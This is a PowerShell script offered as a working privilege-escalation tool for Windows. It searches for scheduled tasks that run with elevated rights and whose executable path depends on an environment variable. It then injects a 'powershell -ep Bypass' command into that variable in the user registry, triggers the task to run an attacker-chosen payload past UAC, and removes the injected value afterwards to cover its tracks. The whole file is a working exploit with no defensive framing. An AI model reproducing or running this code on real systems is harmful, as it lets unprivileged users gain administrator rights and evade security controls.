# Powershell Script

<#
.SYNOPSIS
    Attempts to discover vulnerable scheduled tasks and perform privileged file execution via UAC bypass.

.DESCRIPTION
    ST-UAC-Bypass or Scheduled-Tasks-UAC-Bypass is a script designed to exploit Windows systems by privilege
    escalation. It allows searching for misconfigured scheduled tasks with environment variables vulnerable to
    their modification and command injection, performing a UAC bypass and executing programs in a privileged way
    for normal users.

.PARAMETER DiscoverOnly
    Performs only the discovery of tasks, and their respective environment variables, vulnerable.

.PARAMETER TaskName
    The name of the vulnerable task to be exploited.

.PARAMETER ExploitFile
    The full path to the exploit to be executed.

.PARAMETER Silent
    Suppresses all writing to the standard output.

.EXAMPLE
    scheduled-tasks-uac-bypass -DiscoverOnly

.EXAMPLE
    scheduled-tasks-uac-bypass -TaskName SilentCleanup -ExploitFile ".\exploit.ps1"

.EXAMPLE
    scheduled-tasks-uac-bypass -TaskName SilentCleanup -ExploitFile ".\exploit.ps1" -Silent

.OUTPUTS
    VulnTasksObjectsList

.NOTES
    Author:  Scan0r
    Version: 0.1
    Date:    07-02-2022
#>


# Script configuration


param(
  [Parameter(Mandatory = $false,HelpMessage = "Returns the set of vulnerable tasks in the system")]
  [switch]$DiscoverOnly,
  [Parameter(Mandatory = $false,HelpMessage = "The name of the task to be abused")]
  [string]$TaskName,
  [Parameter(Mandatory = $false,HelpMessage = "The full path of the file to be executed")]
  [string]$ExploitFile,
  [Parameter(Mandatory = $false,HelpMessage = "Enables silent mode")]
  [switch]$Silent
)


# Auxiliary functions


function Log-Output { 
  param(
    [Parameter(Mandatory = $true,HelpMessage = "Message")]
    $Message,
    [Parameter(Mandatory = $true,HelpMessage = "MessageType")]
    [string]$MessageType,
    [Parameter(Mandatory = $false,HelpMessage = "IsObject")]
    [switch]$IsObject
  )

  if (-not $Silent) {
    if ($MessageType -eq "Log") {
      if ($IsObject) {
        $(Write-Output $Message | Out-String).Trim()
      } else {
        Write-Host "[*] $Message"
      }
    } elseif ($MessageType -eq "Verbose") {
      Write-Host -ForegroundColor Cyan "[+] $Message"
    } elseif ($MessageType -eq "Inform") {
      Write-Host -ForegroundColor Yellow "[!] $Message"
    } elseif ($MessageType -eq "Error") {
      Write-Host -ForegroundColor Red "Error: $Message"
    } else {
      throw "Error: Unknown MessageType '$MessageType'"
    }
  }
}


function Get-VulnTasks {
  param(
    [Parameter(Mandatory = $false,HelpMessage = "TaskName")]
    $TaskName
  )

  $tasks = $Null

  if ($TaskName) {
    $tasks = Get-ScheduledTask -TaskName $TaskName
  } else {
    $tasks = Get-ScheduledTask | Where-Object { $_.Principal.RunLevel -ne "Limited" -and
      $_.Principal.LogonType -ne "ServiceAccount" -and
      $_.State -ne "Disabled" -and
      $_.Actions[0].CimClass.CimClassName -eq "MSFT_TaskExecAction" }
  }

  return $tasks
}


function Get-VulnEnvVar {
  param(
    [Parameter(Mandatory = $true,HelpMessage = "Task")]
    $VulnTask
  )

  $ExecutionPath = $VulnTask.Actions.Execute
  $ExecutionPath -match "(?<VulnEnvVar>%.+%)" > $null
  if ($Matches.VulnEnvVar) {
    return $Matches.VulnEnvVar
  } else {
    return $null
  }
}


function Exploit-ScheduledTask {
  param(
    [Parameter(Mandatory = $true,HelpMessage = "VulnTaskURI")]
    [string]$VulnTaskURI,
    [Parameter(Mandatory = $true,HelpMessage = "VulnEnvVar")]
    [string]$VulnEnvVar,
    [Parameter(Mandatory = $true,HelpMessage = "Exploit")]
    [string]$Payload
  )
  

  # We retrieve the variable name witout % characters
  [string]$TargetEnvVarName = $VulnEnvVar.Replace("%","")

  # The command to be injected into the environment variable
  $Exploit = "powershell -nop -ep Bypass -Command `"& `'$Payload`'`";#"
  # We overwrite the value of the vulnerable environment variable to our payload
  Set-ItemProperty -Path "HKCU:\Environment" -Name "$TargetEnvVarName" -Value "$Exploit" -Force
  # We schedule the start of the vulnerable task to be executed immediately
  schtasks /run /TN $URI /I | Out-Null
  # We clean up our steps by deleting the injected command from the vulnerable environment variable
  Remove-ItemProperty -Path "HKCU:\Environment" -Name "$TargetEnvVarName"

  # We inform the user that our exploit has been launched in order to check its results
  Log-Output -Message "Exploit has been launched, check your results!" -MessageType "Inform"
}


# Start of the main program


# If the user has not provided any option, we inform the user that 
if ((-not $DiscoverOnly) -and (-not $ExploitFile) -and (-not $TaskName)) {
  Log-Output -Message "Have not been provided any action to do through the parameters" -MessageType "Inform"
  Log-Output -Message "For usage information use Get-Help: $($MyInvocation.MyCommand.Source)" -MessageType "Inform"
  Log-Output -Message "Exiting..." -MessageType "Inform"
  return

# If the discovery mode is active, we ignore the other parameters and inform the user
} elseif (($DiscoverOnly -and $ExploitFile) -or ($DiscoverOnly -and $TaskName)) {
  Log-Output -Message "Warning: DiscoverOnly action parameter prevails over the parameters ExploitFile and TaskName`n" -MessageType "Inform"

# We check that the user has provided the necessary parameters to launch the exploit
} elseif (($ExploitFile -and (-not $TaskName)) -or ($TaskName -and (-not $ExploitFile))) {
  Log-Output -Message "Wrong combination of parameters. A exploit file and task name must be specified together." -MessageType "Error"
  return
}


# The final powershell object to be returned that will contain the vulnerable task set
$VulnTasksObjectsList = @()


# If the discovery mode is active we start the search, otherwise we get the vulnerable environment variable of the given task
$VulnTasks = $null
if ($DiscoverOnly) {
  $VulnTasks = Get-VulnTasks

} elseif ($TaskName) {
  $VulnTasks = Get-VulnTasks -TaskName $TaskName
}


# We inform the user of the set of variables found, if there is none we give an error and exit
if ($VulnTasks) {
  Log-Output -Message "Got a list of vulnerable scheduled tasks susceptible to been exploited: $($VulnTasks | Out-String)" -MessageType "Log"

} else {
  Log-Output -Message "Have not been found any vulnerable scheduled task susceptible to been exploited. Aborting...`n" -MessageType "Inform"
  return
}


# We iterate over the set of vulnerable variables encountered
foreach ($VulnTask in $VulnTasks)
{
  # For each vulnerable task we obtain its vulnerable environment variable
  [string]$VulnEnvVar = Get-VulnEnvVar -VulnTask $VulnTask
  [string]$TaskName = $VulnTask.TaskName
  Log-Output -Message "Got the vulnerable enviroment variable '$VulnEnvVar' for task '$TaskName'" -MessageType "Log"

  # We add the new tuple, vulnerable task and vulnerable variable to our final object
  $NewObject = [pscustomobject]@{ VulnTask = $VulnTask; VulnEnvVar = $VulnEnvVar }
  $VulnTasksObjectsList += $NewObject
  Log-Output -Message "Added new vulnerable task object to the list: $($NewObject|Out-String)" -MessageType "Log"
}


#  If the discovery mode is active we inform the user about what we discover otherwise we try to launch the exploit
if ($DiscoverOnly) {
  Log-Output -Message "Returning the list of vulnerable task objects." -MessageType "Log"
  return $VulnTasksObjectsList

} elseif ($ExploitFile -and $TaskName) {
  # If we already have privileged permissions, checking our SID with that of administrators, we inform the user and we exit
  if (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544") {
    Log-Output -Message "You already have administrative rights! Have fun :D!" -MessageType "Inform"
    exit
  }

  # We check the validity of the file passed
  if (-not (Test-Path -PathType Leaf $ExploitFile)) {
    throw "Error: invalid exploit file path or not found: '$ExploitFile'"
    return
  }

  # We launch the UAC bypass and the exploit
  $VulnTaskObject = $VulnTasksObjectsList[0]
  $Task = $VulnTaskObject.VulnTask
  [string]$URI = $Task.URI
  [string]$Var = $VulnTaskObject.VulnEnvVar

  Log-Output -Message "Trying to exploit Scheduled Task '$TaskName' with Enviroment Variable '$Var'" -MessageType "Log"
  Exploit-ScheduledTask -VulnTaskURI "$URI" -VulnEnvVar "$Var" -Payload "$ExploitFile"

  # We finish and exit
  Log-Output -Message "Bye!`n" -MessageType "Log"
}

# End

